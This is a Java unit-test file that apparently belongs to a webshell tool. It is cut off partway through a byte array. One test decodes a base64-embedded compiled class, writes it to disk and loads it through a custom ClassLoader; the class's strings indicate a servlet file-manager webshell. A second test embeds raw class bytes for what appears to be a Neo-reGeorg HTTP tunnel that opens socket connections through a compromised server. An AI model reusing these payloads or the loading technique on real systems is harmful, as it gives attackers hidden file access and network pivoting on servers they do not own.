    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }


    @Test
    public void testDecodeBytes()throws Exception{
        String path = "D:\\tmp\\test.class";
        String enc = "yv66vgAAADEBPQoAQwCLCQBwAIwJAHAAjQgAjgkAcACPCACQCQBwAJEIAJIJAHAAkwoAcACUCACVCgCWAJcKAJgAmQoALACaBwCbCgAPAIsIAJwIAJ0IAJ4IAJ8IAKALAFIAoQsAUQCiCwBSAKILAFEAowoAcACkCQBwAKUKAHAApgoADwCnBwCoBwCpCgAfAIsIAKoKAB8AqwoAHgCsCgAfAKwLAFIArQoADwCsCgBwAK4KAK8AsAoAsQCyCgAsALMKACwAtAcAtQoAcAC2CgAsALcHALgKAC8AuQoALwC6CAC7BwC8CAC9CgAzALkHAL4KAC8AvwoANgDACgAzAMEKAC8AwggAwwgAxAoALwDFCADGCgBDAMcIAMgHAMkKAEEAygcAywoAzADNBwDOCgBFAM8IANAKAC8A0QoALwDSCADTCADUCgAvANUKAB8A1ggA1woAQQDYBwDZBwDaBwDbCADcCgBBAN0IAN4KAEEA3wgA4AgAcQoAQQDhCgDiAOMKAOIA5AgAcwcA5QgA5gcA5wkAsQDoCgDMAOMKAEEA6QoAsQDqCgBBAOsKAOwA7QoAQwCsCADuCADvCgAsAPAIAPEIAPIIAIAIAPMIAPQKAEEA9QcA9gEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEADEZpbGVUcmVlQ29kZQEACHBhcnNlT2JqAQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQAIYXNvdXRwdXQBABJCYXNlNjREZWNvZGVUb0J5dGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAKU291cmNlRmlsZQEACERpci5qYXZhDAB6AHsMAHEAcgwAcwB0AQAGYmFzZTY0DAB1AHYBAARVVEY4DAB3AHYBAAEyDAB4AHYMAIQAhQEAEHN1bi5qbnUuZW5jb2RpbmcHAPcMAPgAgQcA+QwA+gD7DAD8AP0BABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAFZWE1YzcBAAVjYmFhNQEADnFhZDgzZTViZTE4NDIxAQAOcjMyNzYwZmNkZDdlMTYBAAl0ZXh0L2h0bWwMAP4A/wwBAAD/DAEBAIEMAIAAgQwAeQB2DACDAIEMAQIBAwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwBAgEEDAEFAQYMAQcBCAwAhgCBBwEJDAEKAP8HAQsMAQwBDQwBDgEPDAB+AH8BABBqYXZhL2xhbmcvU3RyaW5nDACHAIgMAHoBEAEADGphdmEvaW8vRmlsZQwAegD/DAERARIBAAABABpqYXZhL3RleHQvU2ltcGxlRGF0ZUZvcm1hdAEAE3l5eXktTU0tZGQgSEg6bW06c3MBAA5qYXZhL3V0aWwvRGF0ZQwBEwEUDAB6ARUMARYBFwwBGAEZAQABUgEAAS0MARoBGQEAAVcMARsBHAEACmNhbkV4ZWN1dGUBAA9qYXZhL2xhbmcvQ2xhc3MMAR0BHgEAEGphdmEvbGFuZy9PYmplY3QHAR8MASABIQEAEWphdmEvbGFuZy9Cb29sZWFuDAEiARkBAAFYDAEjAQYMASQBGQEAAi8JAQABCQwBJQEUDAECASYBAAEKDAEnARkBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQMAPoBKAEACmdldFJlcXVlc3QMASkBHgEAC2dldFJlc3BvbnNlDAEqASsHASwMAS0BLgwBLwEwAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQALZGVmaW5lQ2xhc3MBAAJbQgwBMQEyDAEzATQMAPwBNQwBNgE3BwE4DAE5AToBAAxqYXZhLnZlcnNpb24BAAMxLjkMATsBDQEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBOQE8AQAPZmlsZW1hbmFnZXIvRGlyAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAYamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0AQAHZm9yTmFtZQEALihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDsBAAd2YWx1ZU9mAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlsaXN0RmlsZXMBABEoKVtMamF2YS9pby9GaWxlOwEADGxhc3RNb2RpZmllZAEAAygpSgEABChKKVYBAAZmb3JtYXQBACQoTGphdmEvdXRpbC9EYXRlOylMamF2YS9sYW5nL1N0cmluZzsBAAdjYW5SZWFkAQADKClaAQAIY2FuV3JpdGUBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAMYm9vbGVhblZhbHVlAQAHZ2V0TmFtZQEAC2lzRGlyZWN0b3J5AQAGbGVuZ3RoAQAcKEopTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2lzQXJyYXkBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEADmdldENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWNvbXBhcmVUbwEAFCgpTGphdmEvbGFuZy9PYmplY3Q7ACEAcABDAAAABgABAHEAcgAAAAEAcwB0AAAAAQB1AHYAAAABAHcAdgAAAAEAeAB2AAAAAQB5AHYAAAAHAAEAegB7AAEAfAAAAE0AAgABAAAAISq3AAEqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJsQAAAAEAfQAAABoABgAAAAsABAAMAAkADQAOAA4AFAAPABoAEAABAH4AfwABAHwAAAFL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";
        byte[] decode = Base64.decode(enc);
        FileOutputStream out = new FileOutputStream(new File(path));
        out.write(decode);
        out.flush();
        out.close();
        Object o = new U(this.getClass().getClassLoader()).g(decode).newInstance();
        System.out.println(o);

//        Method var3 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
//        var3.setAccessible(true);
//        Class var4 = (Class)var3.invoke(this.getClass().getClassLoader(), decode, 0, decode.length);
//        String exp = var4.getConstructor(String.class).newInstance("fuck").toString();
//        System.out.println(exp);


    }



    @Test
    public void testAES()throws Exception{
        byte[] clazzBytes = new byte[]{-54,-2,-70,-66,0,0,0,49,1,-118,10,0,122,0,-115,7,0,-114,7,0,-113,7,0,-112,7,0,124,9,0,121,0,-111,7,0,126,9,0,121,0,-110,7,0,-109,10,0,9,0,-108,7,0,-107,11,0,3,0,-106,11,0,-105,0,-104,11,0,4,0,-103,11,0,3,0,-102,10,0,121,0,-101,10,0,11,0,-100,10,0,121,0,-99,11,0,4,0,-98,11,0,3,0,-97,7,0,-96,10,0,21,0,-95,10,0,21,0,-94,7,0,-93,10,0,24,0,-92,10,0,24,0,-91,11,0,3,0,-90,10,0,-89,0,-88,10,0,-89,0,-87,11,0,-86,0,-85,11,0,-84,0,-83,11,0,-84,0,-82,10,0,11,0,-81,10,0,121,0,-80,10,0,24,0,-79,11,0,3,0,-78,10,0,24,0,-77,7,0,-76,11,0,4,0,-75,11,0,3,0,-74,10,0,-73,0,-72,10,0,-71,0,-70,10,0,-71,0,-69,10,0,-71,0,-68,10,0,24,0,-67,11,0,-66,0,-65,11,0,-64,0,-85,8,0,-63,8,0,-62,10,0,24,0,-61,10,0,24,0,-60,10,0,24,0,-59,10,0,24,0,-58,11,0,4,0,-57,7,0,-56,10,0,55,0,-115,10,0,-55,0,-72,10,0,-54,0,-53,10,0,55,0,-52,10,0,55,0,-51,10,0,11,0,-50,10,0,9,0,-49,11,0,4,0,-48,10,0,-47,0,-46,10,0,-47,0,-69,11,0,4,0,-45,10,0,11,0,-44,10,0,11,0,-43,10,0,11,0,-42,8,0,-41,10,0,11,0,-40,10,0,9,0,-39,10,0,80,0,-38,7,0,-37,10,0,74,0,-36,10,0,80,0,-35,10,0,80,0,-34,11,0,-33,0,-32,11,0,-33,0,-31,7,0,-30,10,0,80,0,-29,10,0,-28,0,-68,11,0,-33,0,-27,10,0,-26,0,-25,10,0,80,0,-24,10,0,-26,0,-23,10,0,121,0,-22,10,0,-21,0,-20,8,0,-19,10,0,-55,0,-18,7,0,-17,10,0,91,0,-115,10,0,91,0,-16,10,0,91,0,-15,10,0,-26,0,-14,10,0,-26,0,-13,10,0,-26,0,-12,10,0,80,0,-11,7,0,-10,10,0,99,0,-115,10,0,99,0,-9,8,0,-8,10,0,99,0,-7,8,0,-6,10,0,99,0,-15,10,0,11,0,-5,10,0,55,0,-4,10,0,55,0,-3,8,0,-2,10,0,11,0,-1,10,0,21,1,0,10,0,115,1,1,11,1,2,1,3,11,1,2,1,4,7,1,5,10,0,115,1,6,7,1,7,7,1,8,10,0,117,1,9,10,0,11,1,10,7,1,11,7,1,12,1,0,2,101,110,1,0,2,91,67,1,0,2,100,101,1,0,2,91,66,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,6,101,113,117,97,108,115,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,90,1,0,5,98,54,52,101,110,1,0,22,40,91,66,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,5,98,54,52,100,101,1,0,22,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,91,66,1,0,9,104,101,97,100,101,114,107,101,121,1,0,38,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,10,69,120,99,101,112,116,105,111,110,115,1,0,7,105,115,108,111,99,97,108,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,90,12,0,127,0,-128,1,0,19,91,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,37,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,114,118,108,101,116,82,101,113,117,101,115,116,1,0,38,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,114,118,108,101,116,82,101,115,112,111,110,115,101,12,0,123,0,124,12,0,125,0,126,1,0,17,106,97,118,97,47,108,97,110,103,47,73,110,116,101,103,101,114,12,1,13,1,14,1,0,16,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,12,1,15,1,16,7,1,17,12,1,18,1,19,12,1,20,1,21,12,1,22,0,-119,12,0,-122,0,-121,12,0,127,1,23,12,0,-117,0,-116,12,1,24,0,-128,12,1,25,1,26,1,0,12,106,97,118,97,47,110,101,116,47,85,82,76,12,0,127,1,27,12,1,28,1,29,1,0,26,106,97,118,97,47,110,101,116,47,72,116,116,112,85,82,76,67,111,110,110,101,99,116,105,111,110,12,1,30,1,27,12,1,31,1,32,12,1,33,1,34,7,1,35,12,1,36,1,37,12,1,38,1,39,7,1,40,12,1,41,1,42,7,1,43,12,1,44,1,45,12,1,46,1,47,12,1,48,0,-116,12,0,-120,0,-119,12,1,49,1,50,12,1,51,1,14,12,1,52,1,53,1,0,19,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,12,1,54,1,50,12,1,55,1,56,7,1,57,12,1,58,1,59,7,1,60,12,1,61,1,62,12,1,63,0,-128,12,1,64,0,-128,12,1,65,1,66,7,1,67,12,1,68,1,69,7,1,70,1,0,14,67,111,110,116,101,110,116,45,76,101,110,103,116,104,1,0,17,84,114,97,110,115,102,101,114,45,69,110,99,111,100,105,110,103,12,1,71,0,-119,12,1,72,1,14,12,1,55,1,73,12,1,74,1,73,12,1,75,1,76,1,0,29,106,97,118,97,47,105,111,47,66,121,116,101,65,114,114,97,121,79,117,116,112,117,116,83,116,114,101,97,109,7,1,77,7,1,78,12,1,79,1,80,12,1,61,1,23,12,1,81,1,82,12,1,83,1,14,12,1,84,1,85,12,1,86,1,50,7,1,87,12,1,61,1,27,12,1,88,0,-128,12,1,89,1,90,12,1,89,1,85,12,1,91,1,92,1,0,2,92,124,12,1,93,1,94,12,1,95,1,92,12,1,96,1,97,1,0,26,106,97,118,97,47,110,101,116,47,73,110,101,116,83,111,99,107,101,116,65,100,100,114,101,115,115,12,0,127,1,98,12,1,99,1,100,12,1,101,1,102,7,1,103,12,1,104,1,105,12,1,106,1,107,1,0,31,106,97,118,97,47,110,105,111,47,99,104,97,110,110,101,108,115,47,83,111,99,107,101,116,67,104,97,110,110,101,108,12,1,108,1,109,7,1,110,12,1,111,1,27,7,1,112,12,1,113,1,114,12,1,58,1,115,12,1,116,1,82,12,0,-124,0,-123,7,1,117,12,1,118,1,119,1,0,0,12,1,120,1,14,1,0,23,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,105,108,100,101,114,12,1,121,1,122,12,1,84,1,26,12,1,123,1,124,12,1,125,1,119,12,1,126,1,45,12,1,61,1,115,1,0,22,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,66,117,102,102,101,114,12,1,121,1,127,1,0,2,61,61,12,1,121,1,-128,1,0,1,61,12,1,-127,1,82,12,0,127,1,76,12,1,61,1,76,1,0,1,45,12,1,-126,1,26,12,1,-125,1,26,12,1,-124,1,34,7,1,-123,12,1,-122,1,45,12,1,-121,1,47,1,0,25,106,97,118,97,47,110,101,116,47,78,101,116,119,111,114,107,73,110,116,101,114,102,97,99,101,12,1,-120,1,34,1,0,20,106,97,118,97,47,110,101,116,47,73,110,101,116,65,100,100,114,101,115,115,1,0,21,106,97,118,97,47,110,101,116,47,73,110,101,116,52,65,100,100,114,101,115,115,12,1,-119,1,26,12,0,-126,0,-125,1,0,10,78,101,111,114,101,71,101,111,114,103,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,1,0,8,105,110,116,86,97,108,117,101,1,0,3,40,41,73,1,0,10,103,101,116,83,101,115,115,105,111,110,1,0,34,40,41,76,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,115,115,105,111,110,59,1,0,30,106,97,118,97,120,47,115,101,114,118,108,101,116,47,104,116,116,112,47,72,116,116,112,83,101,115,115,105,111,110,1,0,17,103,101,116,83,101,114,118,108,101,116,67,111,110,116,101,120,116,1,0,32,40,41,76,106,97,118,97,120,47,115,101,114,118,108,101,116,47,83,101,114,118,108,101,116,67,111,110,116,101,120,116,59,1,0,9,103,101,116,87,114,105,116,101,114,1,0,23,40,41,76,106,97,118,97,47,105,111,47,80,114,105,110,116,87,114,105,116,101,114,59,1,0,9,103,101,116,72,101,97,100,101,114,1,0,5,40,91,66,41,86,1,0,5,114,101,115,101,116,1,0,9,103,101,116,77,101,116,104,111,100,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,14,111,112,101,110,67,111,110,110,101,99,116,105,111,110,1,0,26,40,41,76,106,97,118,97,47,110,101,116,47,85,82,76,67,111,110,110,101,99,116,105,111,110,59,1,0,16,115,101,116,82,101,113,117,101,115,116,77,101,116,104,111,100,1,0,11,115,101,116,68,111,79,117,116,112,117,116,1,0,4,40,90,41,86,1,0,14,103,101,116,72,101,97,100,101,114,78,97,109,101,115,1,0,25,40,41,76,106,97,118,97,47,117,116,105,108,47,69,110,117,109,101,114,97,116,105,111,110,59,1,0,21,106,97,118,97,47,117,116,105,108,47,67,111,108,108,101,99,116,105,111,110,115,1,0,4,108,105,115,116,1,0,46,40,76,106,97,118,97,47,117,116,105,108,47,69,110,117,109,101,114,97,116,105,111,110,59,41,76,106,97,118,97,47,117,116,105,108,47,65,114,114,97,121,76,105,115,116,59,1,0,7,114,101,118,101,114,115,101,1,0,19,40,76,106,97,118,97,47,117,116,105,108,47,76,105,115,116,59,41,86,1,0,14,106,97,118,97,47,117,116,105,108,47,76,105,115,116,1,0,8,105,116,101,114,97,116,111,114,1,0,22,40,41,76,106,97,118,97,47,117,116,105,108,47,73,116,101,114,97,116,111,114,59,1,0,18,106,97,118,97,47,117,116,105,108,47,73,116,101,114,97,116,111,114,1,0,7,104,97,115,78,101,120,116,1,0,3,40,41,90,1,0,4,110,101,120,116,1,0,20,40,41,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,16,101,113,117,97,108,115,73,103,110,111,114,101,67,97,115,101,1,0,18,115,101,116,82,101,113,117,101,115,116,80,114,111,112,101,114,116,121,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,16,103,101,116,67,111,110,116,101,110,116,76,101,110,103,116,104,1,0,15,103,101,116,79,117,116,112,117,116,83,116,114,101,97,109,1,0,24,40,41,76,106,97,118,97,47,105,111,47,79,117,116,112,117,116,83,116,114,101,97,109,59,1,0,9,115,101,116,72,101,97,100,101,114,1,0,14,103,101,116,73,110,112,117,116,83,116,114,101,97,109,1,0,36,40,41,76,106,97,118,97,120,47,115,101,114,118,108,101,116,47,83,101,114,118,108,101,116,73,110,112,117,116,83,116,114,101,97,109,59,1,0,32,106,97,118,97,120,47,115,101,114,118,108,101,116,47,83,101,114,118,108,101,116,73,110,112,117,116,83,116,114,101,97,109,1,0,4,114,101,97,100,1,0,5,40,91,66,41,73,1,0,20,106,97,118,97,47,105,111,47,79,117,116,112,117,116,83,116,114,101,97,109,1,0,5,119,114,105,116,101,1,0,7,40,91,66,73,73,41,86,1,0,5,102,108,117,115,104,1,0,5,99,108,111,115,101,1,0,15,103,101,116,72,101,97,100,101,114,70,105,101,108,100,115,1,0,17,40,41,76,106,97,118,97,47,117,116,105,108,47,77,97,112,59,1,0,13,106,97,118,97,47,117,116,105,108,47,77,97,112,1,0,6,107,101,121,83,101,116,1,0,17,40,41,76,106,97,118,97,47,117,116,105,108,47,83,101,116,59,1,0,13,106,97,118,97,47,117,116,105,108,47,83,101,116,1,0,14,103,101,116,72,101,97,100,101,114,70,105,101,108,100,1,0,15,103,101,116,82,101,115,112,111,110,115,101,67,111,100,101,1,0,23,40,41,76,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,59,1,0,14,103,101,116,69,114,114,111,114,83,116,114,101,97,109,1,0,9,115,101,116,83,116,97,116,117,115,1,0,4,40,73,41,86,1,0,19,106,97,118,97,47,105,111,47,73,110,112,117,116,83,116,114,101,97,109,1,0,16,106,97,118,97,47,108,97,110,103,47,83,121,115,116,101,109,1,0,9,97,114,114,97,121,99,111,112,121,1,0,42,40,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,73,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,73,73,41,86,1,0,11,116,111,66,121,116,101,65,114,114,97,121,1,0,4,40,41,91,66,1,0,6,108,101,110,103,116,104,1,0,8,116,111,83,116,114,105,110,103,1,0,21,40,73,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,9,97,100,100,72,101,97,100,101,114,1,0,14,106,97,118,97,47,105,111,47,87,114,105,116,101,114,1,0,11,114,101,115,101,116,66,117,102,102,101,114,1,0,9,115,117,98,115,116,114,105,110,103,1,0,22,40,73,73,41,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,9,99,111,109,112,97,114,101,84,111,1,0,21,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,73,1,0,5,115,112,108,105,116,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,1,0,8,112,97,114,115,101,73,110,116,1,0,4,111,112,101,110,1,0,35,40,41,76,106,97,118,97,47,110,105,111,47,99,104,97,110,110,101,108,115,47,83,111,99,107,101,116,67,104,97,110,110,101,108,59,1,0,22,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,73,41,86,1,0,7,99,111,110,110,101,99,116,1,0,27,40,76,106,97,118,97,47,110,101,116,47,83,111,99,107,101,116,65,100,100,114,101,115,115,59,41,90,1,0,17,99,111,110,102,105,103,117,114,101,66,108,111,99,107,105,110,103,1,0,40,40,90,41,76,106,97,118,97,47,110,105,111,47,99,104,97,110,110,101,108,115,47,83,101,108,101,99,116,97,98,108,101,67,104,97,110,110,101,108,59,1,0,28,106,97,118,97,120,47,115,101,114,118,108,101,116,47,83,101,114,118,108,101,116,67,111,110,116,101,120,116,1,0,12,115,101,116,65,116,116,114,105,98,117,116,101,1,0,39,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,41,86,1,0,12,103,101,116,65,116,116,114,105,98,117,116,101,1,0,38,40,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,59,1,0,6,115,111,99,107,101,116,1,0,19,40,41,76,106,97,118,97,47,110,101,116,47,83,111,99,107,101,116,59,1,0,15,106,97,118,97,47,110,101,116,47,83,111,99,107,101,116,1,0,15,114,101,109,111,118,101,65,116,116,114,105,98,117,116,101,1,0,19,106,97,118,97,47,110,105,111,47,66,121,116,101,66,117,102,102,101,114,1,0,8,97,108,108,111,99,97,116,101,1,0,24,40,73,41,76,106,97,118,97,47,110,105,111,47,66,121,116,101,66,117,102,102,101,114,59,1,0,24,40,76,106,97,118,97,47,110,105,111,47,66,121,116,101,66,117,102,102,101,114,59,41,73,1,0,5,97,114,114,97,121,1,0,15,106,97,118,97,47,110,105,111,47,66,117,102,102,101